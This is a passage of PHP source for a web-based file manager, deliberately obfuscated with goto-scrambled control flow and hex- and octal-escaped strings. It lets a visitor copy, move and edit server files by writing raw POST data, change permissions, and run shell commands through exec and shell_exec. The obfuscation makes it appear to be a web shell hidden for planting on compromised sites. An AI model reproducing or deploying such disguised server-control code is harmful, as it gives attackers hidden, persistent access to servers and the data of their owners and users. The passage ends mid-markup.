$tr["\x65\x6e"]["\x50\141\x72\164\x69\164\151\x6f\156\x53\151\x7a\145"] = "\120\x61\162\x74\x69\x74\151\157\x6e\x20\163\151\x7a\x65"; $tr["\x65\156"]["\x45\162\162\157\x72\x52\x65\x70\x6f\x72\x74\151\x6e\147"] = "\x45\162\x72\x6f\162\x20\122\x65\x70\157\x72\164\x69\156\x67"; $tr["\x65\x6e"]["\123\150\157\167\110\x69\x64\x64\x65\x6e\106\151\154\x65\x73"] = "\x53\x68\x6f\x77\40\110\x69\x64\x64\145\156\40\106\x69\x6c\x65\163"; $i18n = fm_get_translations($tr); $tr = $i18n ? $i18n : $tr; if (!strlen($lang)) { $lang = "\x65\156"; } if (isset($tr[$lang][$txt])) { return fm_enc($tr[$lang][$txt]); } else { if (isset($tr["\x65\156"][$txt])) { return fm_enc($tr["\x65\156"][$txt]); } else { return "{$txt}"; } } } goto lqlNU; SPWIi: defined("\106\115\137\x4c\x41\x4e\107") || define("\x46\115\137\114\101\x4e\x47", $lang); goto pgJYU; z6GUl: if (isset($_GET["\x63\x6f\160\171"], $_GET["\146\x69\x6e\151\x73\x68"]) && !FM_READONLY) { $copy = $_GET["\x63\157\160\x79"]; $copy = fm_clean_path($copy); if ($copy == '') { fm_set_msg("\123\157\165\x72\x63\145\40\x70\141\164\x68\x20\156\x6f\x74\40\144\x65\146\x69\x6e\x65\144", "\145\162\162\157\162"); fm_redirect(FM_SELF_URL . "\x3f\160\x3d" . urlencode(FM_PATH)); } $from = FM_ROOT_PATH . "\x2f" . $copy; $dest = FM_ROOT_PATH; if (FM_PATH != '') { $dest .= "\57" . FM_PATH; } $dest .= "\x2f" . basename($from); $move = isset($_GET["\x6d\157\x76\x65"]); if ($from != $dest) { $msg_from = trim(FM_PATH . "\x2f" . basename($from), "\x2f"); if ($move) { $rename = fm_rename($from, $dest); if ($rename) { fm_set_msg(sprintf("\x4d\157\166\145\x64\40\146\x72\157\x6d\x20\x3c\142\x3e\45\x73\74\57\142\x3e\40\164\x6f\40\74\x62\x3e\x25\163\x3c\x2f\x62\76", fm_enc($copy), fm_enc($msg_from))); } elseif ($rename === null) { fm_set_msg("\106\151\154\145\x20\157\162\40\146\157\x6c\x64\x65\x72\40\x77\x69\164\150\x20\164\150\x69\x73\x20\x70\x61\x74\x68\40\x61\x6c\162\145\141\144\171\x20\145\x78\151\x73\164\163", "\141\x6c\x65\x72\x74"); } else { fm_set_msg(sprintf("\x45\x72\x72\x6f\162\x20\167\150\151\154\145\40\155\157\x76\x69\x6e\x67\40\x66\x72\x6f\155\40\x3c\142\x3e\45\x73\x3c\x2f\142\76\x20\164\157\40\x3c\x62\76\x25\163\74\57\x62\76", fm_enc($copy), fm_enc($msg_from)), "\x65\162\x72\157\162"); } } else { if (fm_rcopy($from, $dest)) { fm_set_msg(sprintf("\103\x6f\x70\171\x69\145\144\40\146\x72\x6f\155\x20\74\142\76\x25\163\74\x2f\142\76\x20\x74\x6f\x20\74\142\x3e\x25\x73\x3c\x2f\x62\x3e", fm_enc($copy), fm_enc($msg_from))); } else { fm_set_msg(sprintf("\105\162\162\157\162\40\167\150\x69\154\145\40\143\x6f\160\x79\151\156\x67\40\146\162\x6f\x6d\x20\x3c\x62\x3e\x25\x73\74\57\142\x3e\x20\164\x6f\40\x3c\x62\x3e\45\x73\74\x2f\x62\x3e", fm_enc($copy), fm_enc($msg_from)), "\145\x72\162\157\x72"); } } } else { fm_set_msg("\120\141\x74\x68\163\40\155\x75\x73\x74\40\x62\x65\x20\156\157\x74\40\145\x71\x75\x61\154", "\141\x6c\x65\x72\164"); } fm_redirect(FM_SELF_URL . "\x3f\160\75" . urlencode(FM_PATH)); } goto FZRG0; AtcG6: $directories_users = array(); goto UnYp8; gCzHZ: if ($report_errors == true) { @ini_set("\145\162\162\x6f\x72\137\x72\x65\x70\x6f\162\x74\151\x6e\x67", E_ALL); @ini_set("\x64\151\163\x70\154\x61\x79\137\x65\162\x72\157\x72\163", 1); } else { @ini_set("\145\x72\x72\x6f\x72\x5f\x72\x65\160\x6f\162\x74\151\x6e\147", E_ALL); @ini_set("\x64\x69\163\x70\x6c\x61\x79\137\x65\162\x72\157\x72\x73", 0); } goto S82I8; u1pQF: $ik = 6070; goto s7nUd; PerqC: if ($ip_ruleset != "\117\106\x46") { $clientIp = $_SERVER["\122\x45\x4d\117\124\105\x5f\x41\104\x44\122"]; $proceed = false; $whitelisted = in_array($clientIp, $ip_whitelist); $blacklisted = in_array($clientIp, $ip_blacklist); if ($ip_ruleset == "\101\116\x44") { if ($whitelisted == true && $blacklisted == false) { $proceed = true; } } else { if ($ip_ruleset == "\117\122") { if ($whitelisted == true || $blacklisted == false) { $proceed = true; } } } if ($proceed == false) { trigger_error("\x55\163\145\x72\x20\x63\x6f\156\156\145\143\164\x69\157\x6e\40\x64\145\156\151\145\144\40\146\x72\157\155\x3a\40" . $clientIp, E_USER_WARNING); if ($ip_silent == false) { fm_set_msg("\x41\143\143\145\163\x73\x20\144\x65\156\x69\145\144\56\40\111\x50\40\x72\x65\x73\x74\x72\151\x63\x74\151\157\156\40\141\x70\160\154\x69\x63\141\142\154\145", "\x65\x72\162\157\162"); fm_show_header_login(); fm_show_message(); } die; } } goto Ry31U; VPtlR: ?>
</th>
            </tr>
            </thead>
            <?php  goto krXyl; n3dgl: if (isset($_POST["\143\x6f\160\171"]) && !FM_READONLY) { $copy_files = $_POST["\146\x69\x6c\x65"]; if (!is_array($copy_files) || empty($copy_files)) { fm_set_msg("\x4e\x6f\x74\150\151\x6e\x67\40\x73\145\154\145\143\x74\145\144", "\141\x6c\145\x72\164"); fm_redirect(FM_SELF_URL . "\x3f\x70\75" . urlencode(FM_PATH)); } fm_show_header(); fm_show_nav_path(FM_PATH); ?>
    <div class="path">
        <div class="card">
            <div class="card-header">
                <h6><?php  echo lng("\103\157\x70\171\151\156\147"); ?>
</h6>
            </div>
            <div class="card-body">
                <form action="" method="post">
                    <input type="hidden" name="p" value="<?php  echo fm_enc(FM_PATH); ?>
">
                    <input type="hidden" name="finish" value="1">
                    <?php  foreach ($copy_files as $cf) { echo "\74\151\156\x70\165\164\40\164\171\x70\145\75\x22\150\151\x64\144\145\156\x22\40\x6e\141\x6d\145\x3d\x22\x66\x69\x6c\x65\133\x5d\x22\40\x76\x61\154\x75\145\x3d\42" . fm_enc($cf) . "\x22\76" . PHP_EOL; } ?>
                    <p class="break-word"><?php  echo lng("\x46\x69\154\145\x73"); ?>
: <b><?php  echo implode("\x3c\57\x62\76\x2c\40\74\142\76", $copy_files); ?>
</b></p>
                    <p class="break-word"><?php  echo lng("\123\157\x75\162\143\x65\106\157\x6c\x64\x65\162"); ?>
: <?php  echo fm_enc(fm_convert_win(FM_ROOT_PATH . "\57" . FM_PATH)); ?>
<br>
                        <label for="inp_copy_to"><?php  echo lng("\104\x65\163\x74\x69\156\x61\x74\151\x6f\156\x46\x6f\154\x64\x65\x72"); ?>
:</label>
                        <?php  echo FM_ROOT_PATH; ?>
/<input type="text" name="copy_to" id="inp_copy_to" value="<?php  echo fm_enc(FM_PATH); ?>
">
                    </p>
                    <p class="custom-checkbox custom-control"><input type="checkbox" name="move" value="1" id="js-move-files" class="custom-control-input"><label for="js-move-files" class="custom-control-label" style="vertical-align: sub"> <?php  echo lng("\x4d\157\166\145"); ?>
</label></p>
                    <p>
                        <button type="submit" class="btn btn-success"><i class="fa fa-check-circle"></i> <?php  echo lng("\103\157\160\x79"); ?>
</button> &nbsp;
                        <b><a href="?p=<?php  echo urlencode(FM_PATH); ?>
" class="btn btn-outline-primary"><i class="fa fa-times-circle"></i> <?php  echo lng("\103\141\156\x63\145\154"); ?>
</a></b>
                    </p>
                </form>
            </div>
        </div>
    </div>
    <?php  fm_show_footer(); die; } goto uQNH2; pgJYU: defined("\106\x4d\x5f\x45\130\124\x45\x4e\x53\x49\117\116") || define("\x46\x4d\137\x45\x58\124\105\x4e\x53\111\117\x4e", $allowed_extensions); goto mDqoS; c1Oy8: $folders = array(); goto b41Cs; fodcY: function fm_get_size($file) { static $iswin; if (!isset($iswin)) { $iswin = strtoupper(substr(PHP_OS, 0, 3)) == "\x57\111\x4e"; } static $exec_works; if (!isset($exec_works)) { $exec_works = function_exists("\145\x78\145\143") && !ini_get("\163\141\x66\x65\x5f\x6d\157\x64\x65") && @exec("\x65\143\x68\x6f\40\x45\130\x45\x43") == "\105\x58\105\103"; } if ($exec_works) { $cmd = $iswin ? "\146\x6f\162\40\45\106\40\x69\x6e\40\50\42{$file}\x22\x29\40\x64\x6f\x20\x40\x65\x63\x68\157\40\x25\176\x7a\106" : "\163\164\141\164\x20\55\143\x25\x73\x20\x22{$file}\42"; @exec($cmd, $output); if (is_array($output) && ctype_digit($size = trim(implode("\xa", $output)))) { return $size; } } if ($iswin && class_exists("\103\117\115")) { try { $fsobj = new COM("\x53\x63\x72\x69\160\164\x69\156\x67\56\106\x69\154\145\123\x79\x73\164\x65\x6d\117\x62\152\145\143\164"); $f = $fsobj->GetFile(realpath($file)); $size = $f->Size; } catch (Exception $e) { $size = null; } if (ctype_digit($size)) { return $size; } } return filesize($file); } goto NiwBi; ToiwW: function fm_redirect($url, $code = 302) { header("\x4c\157\x63\141\x74\151\x6f\x6e\72\x20" . $url, true, $code); die; } goto h7Fii; WthxL: $parent = fm_get_parent_path(FM_PATH); goto SNE7b; rsa6x: unset($p, $use_auth, $iconv_input_encoding, $use_highlightjs, $highlightjs_style); goto T_JFH; Wnm3Z: $edit_files = true; goto Mr_GM; y_jFd: function fm_get_parent_path($path) { $path = fm_clean_path($path); if ($path != '') { $array = explode("\x2f", $path); if (count($array) > 1) { $array = array_slice($array, 0, -1); return implode("\x2f", $array); } return ''; } return false; } goto D8fTT; jpPU0: function fm_get_text_mimes() { return array("\141\160\x70\154\151\143\141\x74\151\157\x6e\x2f\x78\x6d\154", "\141\x70\160\x6c\151\x63\x61\x74\x69\x6f\x6e\x2f\152\x61\x76\x61\163\x63\162\x69\160\x74", "\141\160\x70\154\x69\143\141\x74\151\x6f\x6e\x2f\x78\55\152\141\166\141\163\x63\x72\151\x70\x74", "\x69\155\x61\x67\x65\x2f\x73\x76\x67\53\x78\155\154", "\x6d\145\x73\163\141\147\145\57\162\146\x63\x38\x32\x32"); } goto MPToG; nQ4OP: $use_auth = true; goto FseU3; Mr_GM: $default_timezone = "\x45\x74\x63\57\x55\x54\103"; goto SyckF; LwRXQ: if (!defined("\x46\x4d\x5f\123\x45\123\x53\x49\117\116\x5f\111\x44")) { define("\106\x4d\x5f\123\x45\x53\x53\111\117\116\137\x49\x44", "\146\151\x6c\x65\x6d\141\156\141\147\x65\162"); } goto g_UrP; aRgjH: ?>
</th>
                <th><?php  goto vUu8h; objlx: echo lng("\x41\x63\x74\x69\157\156\163"); goto VPtlR; xyuQx: $CONFIG = "\x7b\x22\x6c\x61\156\147\x22\72\x22\145\156\x22\x2c\42\145\x72\x72\157\x72\x5f\x72\145\x70\x6f\162\x74\151\156\x67\42\x3a\146\141\x6c\x73\x65\54\42\x73\150\157\167\137\150\151\144\x64\x65\156\42\72\x66\141\154\163\x65\x7d"; goto w18Yk; DRXTm: if (!FM_READONLY) { ?>
        <div class="col-xs-12 col-sm-9">
            <ul class="list-inline footer-action">
                <li class="list-inline-item"> <a href="#/select-all" class="btn btn-small btn-outline-primary btn-2" onclick="select_all();return false;"><i class="fa fa-check-square"></i> <?php  echo lng("\x53\145\x6c\145\143\164\101\x6c\x6c"); ?>
 </a></li>
                <li class="list-inline-item"><a href="#/unselect-all" class="btn btn-small btn-outline-primary btn-2" onclick="unselect_all();return false;"><i class="fa fa-window-close"></i> <?php  echo lng("\x55\156\x53\145\x6c\145\143\164\101\154\154"); ?>
 </a></li>
                <li class="list-inline-item"><a href="#/invert-all" class="btn btn-small btn-outline-primary btn-2" onclick="invert_all();return false;"><i class="fa fa-th-list"></i> <?php  echo lng("\111\x6e\x76\145\162\164\123\x65\x6c\x65\143\164\x69\x6f\156"); ?>
 </a></li>
                <li class="list-inline-item"><input type="submit" class="hidden" name="delete" id="a-delete" value="Delete" onclick="return confirm('Delete selected files and folders?')">
                    <a href="javascript:document.getElementById('a-delete').click();" class="btn btn-small btn-outline-primary btn-2"><i class="fa fa-trash"></i> <?php  echo lng("\x44\145\x6c\145\x74\145"); ?>
 </a></li>
                <li class="list-inline-item"><input type="submit" class="hidden" name="zip" id="a-zip" value="zip" onclick="return confirm('Create archive?')">
                    <a href="javascript:document.getElementById('a-zip').click();" class="btn btn-small btn-outline-primary btn-2"><i class="fa fa-file-archive-o"></i> <?php  echo lng("\132\x69\x70"); ?>
 </a></li>
                <li class="list-inline-item"><input type="submit" class="hidden" name="tar" id="a-tar" value="tar" onclick="return confirm('Create archive?')">
                    <a href="javascript:document.getElementById('a-tar').click();" class="btn btn-small btn-outline-primary btn-2"><i class="fa fa-file-archive-o"></i> <?php  echo lng("\124\x61\x72"); ?>
 </a></li>
                <li class="list-inline-item"><input type="submit" class="hidden" name="copy" id="a-copy" value="Copy">
                    <a href="javascript:document.getElementById('a-copy').click();" class="btn btn-small btn-outline-primary btn-2"><i class="fa fa-files-o"></i> <?php  echo lng("\x43\x6f\160\171"); ?>
 </a></li>
            </ul>
        </div>
        <?php  } goto BtoPt; AKU3A: if (!empty($files)) { natcasesort($files); } goto j2Eiq; V7TuA: function fm_show_image($img) { $modified_time = gmdate("\x44\54\40\x64\40\115\40\131\40\x30\60\x3a\60\60\x3a\x30\x30") . "\x20\x47\115\x54"; $expires_time = gmdate("\104\x2c\40\x64\x20\x4d\x20\131\40\x30\60\x3a\x30\x30\x3a\x30\60", strtotime("\53\61\40\x64\141\171")) . "\x20\107\x4d\x54"; $img = trim($img); $images = fm_get_images(); $image = "\x69\126\102\117\x52\167\60\113\107\147\157\101\101\101\101\116\x53\x55\x68\x45\x55\147\x41\101\x41\x41\105\101\x41\x41\x41\102\x43\x41\131\101\101\x41\x41\146\x46\x63\x53\x4a\x41\101\101\x41\105\x45\154\105\121\x56\122\x34\x32\x6d\x4c\x34\x2f\57\x38\x2f\101\x30\103\101\101\121\x41\x49\57\101\x4c\53\x32\x36\x4a\116\106\147\101\x41\101\x41\x42\112\122\x55\x35\x45\162\153\x4a\147\x67\147\75\x3d"; if (isset($images[$img])) { $image = $images[$img]; } $image = base64_decode($image); if (function_exists("\x6d\x62\x5f\x73\x74\162\x6c\145\x6e")) { $size = mb_strlen($image, "\x38\x62\x69\x74"); } else { $size = strlen($image); } if (function_exists("\x68\145\x61\144\x65\162\x5f\x72\x65\155\157\x76\145")) { header_remove("\x43\x61\143\x68\x65\x2d\x43\157\156\164\x72\x6f\x6c"); header_remove("\x50\162\x61\x67\155\141"); } else { header("\x43\x61\143\150\x65\x2d\103\x6f\156\164\162\157\x6c\x3a"); header("\x50\x72\x61\147\155\x61\x3a"); } header("\x4c\141\x73\164\55\115\x6f\144\x69\146\151\x65\x64\72\x20" . $modified_time, true, 200); header("\x45\x78\160\151\x72\145\163\72\x20" . $expires_time); header("\103\x6f\x6e\x74\x65\x6e\x74\x2d\114\145\156\x67\164\150\72\40" . $size); header("\x43\157\x6e\x74\x65\x6e\x74\x2d\x54\171\x70\x65\x3a\x20\x69\x6d\x61\147\145\57\160\x6e\147"); echo $image; die; } goto LL7OD; GHblK: $ip_whitelist = array("\61\62\67\56\x30\x2e\60\56\x31", "\72\72\61"); goto uJKeT; c1Xrh: ?>
</th>
                <th><?php  goto M8q67; wP0pl: function fm_get_mime_type($file_path) { if (function_exists("\146\151\x6e\x66\157\137\x6f\x70\145\156")) { $finfo = finfo_open(FILEINFO_MIME_TYPE); $mime = finfo_file($finfo, $file_path); finfo_close($finfo); return $mime; } elseif (function_exists("\x6d\x69\x6d\x65\x5f\143\x6f\156\x74\x65\156\x74\x5f\x74\171\160\145")) { return mime_content_type($file_path); } elseif (!stristr(ini_get("\144\151\x73\x61\x62\154\145\x5f\146\165\156\143\x74\x69\x6f\156\x73"), "\163\x68\145\x6c\x6c\x5f\x65\170\x65\x63")) { $file = escapeshellarg($file_path); $mime = shell_exec("\146\151\154\145\40\55\142\x69\40" . $file); return $mime; } else { return "\55\x2d"; } } goto ToiwW; ITvAC: if (isset($_GET["\x65\x64\x69\x74"])) { $file = $_GET["\145\x64\151\164"]; $file = fm_clean_path($file); $file = str_replace("\57", '', $file); if ($file == '' || !is_file($path . "\x2f" . $file)) { fm_set_msg("\106\x69\154\145\x20\x6e\157\164\x20\146\x6f\x75\156\x64", "\x65\x72\x72\157\162"); fm_redirect(FM_SELF_URL . "\77\x70\x3d" . urlencode(FM_PATH)); } header("\130\x2d\130\123\x53\x2d\120\x72\157\164\145\x63\x74\x69\157\156\72\x30"); fm_show_header(); fm_show_nav_path(FM_PATH); $file_url = FM_ROOT_URL . fm_convert_win((FM_PATH != '' ? "\x2f" . FM_PATH : '') . "\x2f" . $file); $file_path = $path . "\57" . $file; $isNormalEditor = true; if (isset($_GET["\145\x6e\166"])) { if ($_GET["\x65\156\x76"] == "\x61\x63\145") { $isNormalEditor = false; } } if (isset($_POST["\x73\x61\166\145\144\x61\x74\x61"])) { $writedata = $_POST["\x73\141\166\x65\144\x61\x74\141"]; $fd = fopen($file_path, "\x77"); @fwrite($fd, $writedata); fclose($fd); fm_set_msg("\x46\151\154\145\x20\123\141\x76\x65\x64\x20\x53\165\143\x63\x65\163\163\x66\x75\x6c\x6c\171"); } $ext = strtolower(pathinfo($file_path, PATHINFO_EXTENSION)); $mime_type = fm_get_mime_type($file_path); $filesize = filesize($file_path); $is_text = false; $content = ''; if (in_array($ext, fm_get_text_exts()) || substr($mime_type, 0, 4) == "\164\145\170\x74" || in_array($mime_type, fm_get_text_mimes())) { $is_text = true; $content = file_get_contents($file_path); } ?>
    <div class="path">
        <div class="row">
            <div class="col-xs-12 col-sm-5 col-lg-6 pt-1">
                <div class="btn-toolbar" role="toolbar">
                    <?php  if (!$isNormalEditor) { ?>
                        <div class="btn-group js-ace-toolbar">
                            <button data-cmd="none" data-option="fullscreen" class="btn btn-sm btn-outline-secondary" id="js-ace-fullscreen" title="Fullscreen"><i class="fa fa-expand" title="Fullscreen"></i></button>
                            <button data-cmd="find" class="btn btn-sm btn-outline-secondary" id="js-ace-search" title="Search"><i class="fa fa-search" title="Search"></i></button>
                            <button data-cmd="undo" class="btn btn-sm btn-outline-secondary" id="js-ace-undo" title="Undo"><i class="fa fa-undo" title="Undo"></i></button>
                            <button data-cmd="redo" class="btn btn-sm btn-outline-secondary" id="js-ace-redo" title="Redo"><i class="fa fa-repeat" title="Redo"></i></button>
                            <button data-cmd="none" data-option="wrap" class="btn btn-sm btn-outline-secondary" id="js-ace-wordWrap" title="Word Wrap"><i class="fa fa-text-width" title="Word Wrap"></i></button>
                            <button data-cmd="none" data-option="help" class="btn btn-sm btn-outline-secondary" id="js-ace-goLine" title="Help"><i class="fa fa-question" title="Help"></i></button>
                            <select id="js-ace-mode" data-type="mode" title="Select Document Type" class="btn-outline-secondary border-left-0 d-none d-md-block"><option>-- Select Mode --</option></select>
                            <select id="js-ace-theme" data-type="theme" title="Select Theme" class="btn-outline-secondary border-left-0 d-none d-lg-block"><option>-- Select Theme --</option></select>
                        </div>
                    <?php  } ?>
                </div>
            </div>
            <div class="edit-file-actions col-xs-12 col-sm-7 col-lg-6 text-right pt-1">
                <a title="Back" class="btn btn-sm btn-outline-primary" href="?p=<?php  echo urlencode(trim(FM_PATH)); ?>
&amp;view=<?php  echo urlencode($file); ?>
"><i class="fa fa-reply-all"></i> <?php  echo lng("\x42\x61\143\153"); ?>
</a>
                <a title="Backup" class="btn btn-sm btn-outline-primary" href="javascript:backup('<?php  echo urlencode($path); ?>
','<?php  echo urlencode($file); ?>
')"><i class="fa fa-database"></i> <?php  echo lng("\x42\141\143\153\x55\x70"); ?>
</a>
                <?php  if ($is_text) { ?>
                    <?php  if ($isNormalEditor) { ?>
                        <a title="Advanced" class="btn btn-sm btn-outline-primary" href="?p=<?php  echo urlencode(trim(FM_PATH)); ?>
&amp;edit=<?php  echo urlencode($file); ?>
&amp;env=ace"><i class="fa fa-pencil-square-o"></i> <?php  echo lng("\x41\144\x76\141\156\x63\145\x64\x45\144\x69\164\157\x72"); ?>
</a>
                        <button type="button" class="btn btn-sm btn-outline-primary name="Save" data-url="<?php  echo fm_enc($file_url); ?>
" onclick="edit_save(this,'nrl')"><i class="fa fa-floppy-o"></i> Save
                        </button>
                    <?php  } else { ?>
                        <a title="Plain Editor" class="btn btn-sm btn-outline-primary" href="?p=<?php  echo urlencode(trim(FM_PATH)); ?>
&amp;edit=<?php  echo urlencode($file); ?>
"><i class="fa fa-text-height"></i> <?php  echo lng("\x4e\x6f\x72\155\x61\154\x45\144\151\164\x6f\162"); ?>
</a>
                        <button type="button" class="btn btn-sm btn-outline-primary" name="Save" data-url="<?php  echo fm_enc($file_url); ?>
" onclick="edit_save(this,'ace')"><i class="fa fa-floppy-o"></i> <?php  echo lng("\123\141\166\145"); ?>
                        </button>
                    <?php  } ?>
                <?php  } ?>
            </div>
        </div>
        <?php  if ($is_text && $isNormalEditor) { echo "\74\x74\x65\170\164\x61\162\145\x61\x20\143\x6c\141\163\x73\x3d\42\x6d\x74\x2d\62\42\40\151\x64\75\x22\x6e\x6f\162\x6d\x61\154\x2d\145\144\151\x74\x6f\x72\x22\x20\x72\x6f\x77\163\75\x22\x33\x33\x22\40\143\x6f\x6c\x73\75\42\x31\62\x30\x22\40\163\x74\x79\x6c\145\75\x22\167\x69\x64\x74\150\72\40\71\71\x2e\x35\x25\73\42\76" . htmlspecialchars($content) . "\x3c\x2f\164\x65\x78\x74\x61\162\145\x61\x3e"; } elseif ($is_text) { echo "\x3c\x64\151\166\40\151\144\x3d\42\x65\144\151\164\157\x72\42\40\143\x6f\x6e\164\x65\x6e\x74\145\144\151\x74\141\142\154\145\75\42\x74\162\x75\145\x22\76" . htmlspecialchars($content) . "\x3c\57\x64\151\x76\x3e"; } else { fm_set_msg("\106\111\x4c\105\x20\x45\x58\x54\x45\x4e\x53\111\x4f\x4e\x20\110\101\123\x20\x4e\117\x54\x20\123\125\x50\120\x4f\122\124\x45\x44", "\145\x72\162\x6f\162"); } ?>
    </div>
    <?php  fm_show_footer(); die; } goto RUVxh; Z_Z9n: function fm_get_video_exts() { return array("\x77\x65\x62\x6d", "\x6d\x70\64", "\155\x34\166", "\x6f\147\155", "\x6f\x67\x76", "\155\x6f\166", "\155\153\x76"); } goto CxVwW; DBPas: define("\115\x41\130\137\125\120\x4c\x4f\x41\104\137\123\111\x5a\105", "\x32\60\x34\x38"); goto LwRXQ; Nlh5F: if (isset($_GET["\163\x65\164\164\151\156\147\x73"]) && !FM_READONLY) { fm_show_header(); fm_show_nav_path(FM_PATH); global $cfg, $lang, $lang_list; ?>

    <div class="col-md-8 offset-md-2 pt-3">
        <div class="card mb-2">
            <h6 class="card-header">
                <i class="fa fa-cog"></i>  <?php  echo lng("\123\145\164\x74\151\156\x67\163"); ?>
                <a href="?p=<?php  echo FM_PATH; ?>
" class="float-right"><i class="fa fa-window-close"></i> <?php  echo lng("\x43\x61\x6e\143\145\x6c"); ?>
</a>
            </h6>
            <div class="card-body">
                <form id="js-settings-form" action="" method="post" data-type="ajax" onsubmit="return save_settings(this)">
                    <input type="hidden" name="type" value="settings" aria-label="hidden" aria-hidden="true">
                    <div class="form-group row">
                        <label for="js-language" class="col-sm-3 col-form-label"><?php  echo lng("\114\x61\156\147\165\x61\x67\x65"); ?>
</label>
                        <div class="col-sm-5">
                            <select class="form-control" id="js-language" name="js-language">
                                <?php  function getSelected($l) { global $lang; return $lang == $l ? "\163\145\154\x65\x63\x74\145\x64" : ''; } foreach ($lang_list as $k => $v) { echo "\74\x6f\160\164\151\x6f\x6e\40\x76\141\x6c\165\145\75\x27{$k}\47\x20" . getSelected($k) . "\76{$v}\x3c\x2f\x6f\160\x74\x69\157\x6e\x3e"; } ?>
                            </select>
                        </div>
                    </div>
                    <?php  function getChecked($conf, $val, $txt) { if ($conf == 1 && $val == 1) { return $txt; } else { if ($conf == '' && $val == '') { return $txt; } else { return ''; } } } ?>
                    <div class="form-group row">
                        <label for="js-err-rpt-1" class="col-sm-3 col-form-label"><?php  echo lng("\x45\x72\162\157\162\122\145\160\157\162\164\x69\156\147"); ?>
</label>
                        <div class="col-sm-9">
                            <div class="btn-group btn-group-toggle" data-toggle="buttons">
                                <label class="btn btn-secondary <?php  echo getChecked($report_errors, 1, "\x61\x63\x74\x69\x76\x65"); ?>
">
                                    <input type="radio" name="js-error-report" id="js-err-rpt-1" autocomplete="off" value="true" <?php  echo getChecked($report_errors, 1, "\143\x68\145\x63\153\x65\x64"); ?>
 > ON
                                </label>
                                <label class="btn btn-secondary <?php  echo getChecked($report_errors, '', "\141\143\164\x69\166\x65"); ?>
">
                                    <input type="radio" name="js-error-report" id="js-err-rpt-0" autocomplete="off" value="false" <?php  echo getChecked($report_errors, '', "\x63\x68\145\x63\153\145\144"); ?>
 > OFF
                                </label>
                            </div>
                        </div>
                    </div>

                    <div class="form-group row">
                        <label for="js-hdn-1" class="col-sm-3 col-form-label"><?php  echo lng("\x53\x68\x6f\167\x48\x69\144\144\145\x6e\x46\151\x6c\145\x73"); ?>
</label>
                        <div class="col-sm-9">
                            <div class="btn-group btn-group-toggle" data-toggle="buttons">
                                <label class="btn btn-secondary <?php  echo getChecked($show_hidden_files, 1, "\x61\143\x74\151\x76\145"); ?>
">
                                    <input type="radio" name="js-show-hidden" id="js-hdn-1" autocomplete="off" value="true" <?php  echo getChecked($show_hidden_files, 1, "\x63\150\x65\x63\x6b\145\x64"); ?>
 > ON
                                </label>
                                <label class="btn btn-secondary <?php  echo getChecked($show_hidden_files, '', "\141\x63\164\151\166\145"); ?>
">
                                    <input type="radio" name="js-show-hidden" id="js-hdn-0" autocomplete="off" value="false" <?php  echo getChecked($show_hidden_files, '', "\x63\150\145\x63\153\145\x64"); ?>
 > OFF
                                </label>
                            </div>
                        </div>
                    </div>

                    <div class="form-group row">
                        <div class="col-sm-10">
                            <button type="submit" class="btn btn-success"> <i class="fa fa-check-circle"></i> <?php  echo lng("\x53\141\x76\x65"); ?>
</button>
                        </div>
                    </div>

                </form>
            </div>
        </div>
    </div>
    <?php  fm_show_footer(); die; } goto xBKaT; hDrSW: ?>
</th>
                <?php  goto y_xb4; q8bha: defined("\106\115\x5f\x52\x4f\117\x54\137\120\x41\124\x48") || define("\106\115\x5f\x52\x4f\x4f\x54\137\120\101\124\110", $root_path); goto SPWIi; U8934: defined("\106\115\x5f\x53\105\x4c\x46\137\x55\x52\114") || define("\106\115\x5f\x53\105\x4c\106\x5f\x55\x52\114", ($is_https ? "\x68\164\164\x70\x73" : "\x68\164\x74\160") . "\72\x2f\57" . $http_host . $_SERVER["\120\110\120\x5f\x53\x45\x4c\106"]); goto vD5eJ; kYuZl: function fm_convert_win($filename) { if (FM_IS_WIN && function_exists("\x69\x63\x6f\x6e\x76")) { $filename = iconv(FM_ICONV_INPUT_ENC, "\x55\124\x46\x2d\70\57\x2f\x49\107\116\x4f\x52\x45", $filename); } return $filename; } goto UBUSr; RWOyh: if (isset($_GET["\x69\155\x67"])) { fm_show_image($_GET["\x69\x6d\x67"]); } goto PerqC; UdO2P: function fm_rchmod($path, $filemode, $dirmode) { if (is_dir($path)) { if (!chmod($path, $dirmode)) { return false; } $objects = scandir($path); if (is_array($objects)) { foreach ($objects as $file) { if ($file != "\x2e" && $file != "\x2e\x2e") { if (!fm_rchmod($path . "\57" . $file, $filemode, $dirmode)) { return false; } } } } return true; } elseif (is_link($path)) { return true; } elseif (is_file($path)) { return chmod($path, $filemode); } return false; } goto hCqhf; z29n_: function fm_show_nav_path($path) { global $lang, $sticky_navbar; $isStickyNavBar = $sticky_navbar ? "\146\x69\x78\145\144\x2d\164\157\160" : ''; ?>
    <nav class="navbar navbar-expand-lg navbar-light bg-white mb-4 main-nav <?php  echo $isStickyNavBar; ?>
">
        <a class="navbar-brand" href=""> <?php  echo lng("\x41\160\160\124\151\164\x6c\145"); ?>
 </a>
        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
            <span class="navbar-toggler-icon"></span>
        </button>
        <div class="collapse navbar-collapse" id="navbarSupportedContent">

            <?php  $path = fm_clean_path($path); $root_url = "\74\141\x20\x68\162\145\146\75\47\77\160\75\x27\76\74\151\40\143\x6c\x61\x73\163\x3d\47\x66\x61\40\146\141\x2d\150\157\155\145\47\40\141\162\151\x61\55\x68\151\x64\x64\x65\156\x3d\47\x74\162\x75\145\x27\x20\x74\x69\x74\x6c\x65\75\47" . FM_ROOT_PATH . "\47\x3e\x3c\57\x69\x3e\74\57\141\x3e"; $sep = "\74\151\40\x63\x6c\x61\163\x73\75\x22\x62\x72\145\x61\144\55\143\162\x75\x6d\x62\42\76\x20\57\x20\x3c\57\x69\76"; if ($path != '') { $exploded = explode("\x2f", $path); $count = count($exploded); $array = array(); $parent = ''; for ($i = 0; $i < $count; $i++) { $parent = trim($parent . "\x2f" . $exploded[$i], "\x2f"); $parent_enc = urlencode($parent); $array[] = "\74\141\x20\x68\162\x65\146\x3d\47\x3f\160\75{$parent_enc}\x27\x3e" . fm_enc(fm_convert_win($exploded[$i])) . "\x3c\57\x61\x3e"; } $root_url .= $sep . implode($sep, $array); } echo "\74\144\x69\166\40\143\x6c\x61\x73\x73\75\x22\x63\157\x6c\x2d\170\x73\x2d\x36\x20\143\x6f\154\55\x73\x6d\55\x35\42\76" . $root_url . "\x3c\57\x64\151\166\x3e"; ?>

            <div class="col-xs-6 col-sm-7 text-right">
                <ul class="navbar-nav mr-auto float-right">
